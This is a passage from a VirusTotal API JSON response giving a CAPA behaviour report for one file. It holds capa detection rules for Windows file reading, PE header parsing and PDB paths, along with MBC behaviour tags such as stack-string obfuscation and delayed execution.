                        "rule_src": "rule:\n  meta:\n    name: read file on Windows\n    namespace: host-interaction/file-system/read\n    authors:\n      - moritz.raabe@mandiant.com\n      - anushka.virgaonkar@mandiant.com\n    scopes:\n      static: function\n      dynamic: thread\n    mbc:\n      - File System::Read File [C0051]\n    examples:\n      - BFB9B5391A13D0AFD787E87AB90F14F5:0x1314567B\n  features:\n    - or:\n      - and:\n        - os: windows\n        - optional:\n          - and:\n            - number: 0x80000000 = GENERIC_READ\n            - match: create or open file\n        - or:\n          - api: kernel32.ReadFile\n          - api: ReadFileEx\n          - api: NtReadFile\n          - api: ZwReadFile\n          - api: LZRead\n          - api: _read\n          - api: fread\n      - api: System.IO.File::ReadAllBytes\n      - api: System.IO.File::ReadAllBytesAsync\n      - api: System.IO.File::ReadAllLines\n      - api: System.IO.File::ReadAllLinesAsync\n      - api: System.IO.File::ReadAllText\n      - api: System.IO.File::ReadAllTextAsync\n      - api: System.IO.File::ReadLines\n",
                        "name": "read file on Windows",
                        "description": "host-interaction/file-system/read"
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: parse PE header\n    namespace: load-code/pe\n    authors:\n      - moritz.raabe@mandiant.com\n    scopes:\n      static: function\n      dynamic: unsupported  # requires mnemonic, operand[1].offset features\n    att&ck:\n      - Execution::Shared Modules [T1129]\n    examples:\n      - 9324D1A8AE37A36AE560C37448C9705A:0x403DD0\n  features:\n    - and:\n      - os: windows\n      - and:\n        - mnemonic: cmp\n        - or:\n          - number: 0x4550 = IMAGE_NT_SIGNATURE (PE)\n          - and:\n            - number: 0x50\n            - number: 0x45\n        - or:\n          - number: 0x5A4D = IMAGE_DOS_SIGNATURE (MZ)\n          - and:\n            - number: 0x4D\n            - number: 0x5A\n        - optional:\n          - and:\n            - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\n            - or:\n              - and:\n                - arch: i386\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\n                - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n              - and:\n                - arch: amd64\n                - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\n                - operand[1].offset: 0x30 = IMAGE_NT_HEADERS64.OptionalHeader.ImageBase\n          - basic block:\n            - and:\n              - operand[1].offset: 0x3C = IMAGE_DOS_HEADER.e_lfanew\n              - 3 or more:\n                - operand[1].offset: 0x4 = IMAGE_NT_HEADERS.FileHeader.Machine\n                - operand[1].offset: 0x6 = IMAGE_NT_HEADERS.FileHeader.NumberOfSections\n                - operand[1].offset: 0x14 = IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader\n                - operand[1].offset: 0x16 = IMAGE_NT_HEADERS.FileHeader.Characteristics\n                - operand[1].offset: 0x28 = IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint  # for 32 and 64 bit\n                - or:\n                  - and:\n                    - arch: i386\n                    - operand[1].offset: 0x34 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage\n                  - and:\n                    - arch: amd64\n                    - operand[1].offset: 0x30 = IMAGE_NT_HEADERS.OptionalHeader.ImageBase\n                    - operand[1].offset: 0x50 = IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage\n",
                        "name": "parse PE header",
                        "description": "load-code/pe"
                    },
                    {
                        "format": "SIG_FORMAT_CAPA",
                        "authors": [
                            "moritz.raabe@mandiant.com"
                        ],
                        "rule_src": "rule:\n  meta:\n    name: contains PDB path\n    namespace: executable/pe/pdb\n    authors:\n      - moritz.raabe@mandiant.com\n    scopes:\n      static: file\n      dynamic: file\n    examples:\n      - 464EF2CA59782CE697BC329713698CCC  # level32.exe\n  features:\n    - string: /:\\\\.*\\.pdb/\n",
                        "name": "contains PDB path",
                        "description": "executable/pe/pdb"
                    }
                ],
                "analysis_date": 1704656102,
                "sandbox_name": "CAPA",
                "behash": "c152ee143f373489f80b8bfdfc2aaadd",
                "has_memdump": false,
                "mbc": [
                    {
                        "objective": "File System",
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "create or open file"
                            }
                        ],
                        "id": "C0016",
                        "behavior": "Create File"
                    },
                    {
                        "objective": "Anti-Static Analysis",
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "contain obfuscated stackstrings"
                            }
                        ],
                        "id": "B0032.020",
                        "behavior": "Executable Code Obfuscation",
                        "method": "Argument Obfuscation"
                    },
                    {
                        "objective": "Anti-Static Analysis",
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "contain obfuscated stackstrings"
                            }
                        ],
                        "id": "B0032.017",
                        "behavior": "Executable Code Obfuscation",
                        "method": "Stack Strings"
                    },
                    {
                        "objective": "Anti-Behavioral Analysis",
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "delay execution"
                            }
                        ],
                        "id": "B0003.003",
                        "behavior": "Dynamic Analysis Evasion",
                        "method": "Delayed Execution"
                    },
                    {
                        "objective": "File System",
                        "refs": [
                            {
                                "ref": "#signature_matches",
                                "value": "read file on Windows"
                            }
                        ],
                        "id": "C0051",
                        "behavior": "Read File"
                    }
                ],
                "has_html_report": false,
                "last_modification_date": 1707110494,
                "has_pcap": false,
                "has_evtx": false
            }
        }
    ],
    "meta": {
        "count": 2
    },
    "links": {
        "self": "https://www.virustotal.com/api/v3/files/48419c4d9059c994e8ab17a2d3948634388dc61fc282431b380c2c76f2d3f114/behaviours?limit=10"
    }
}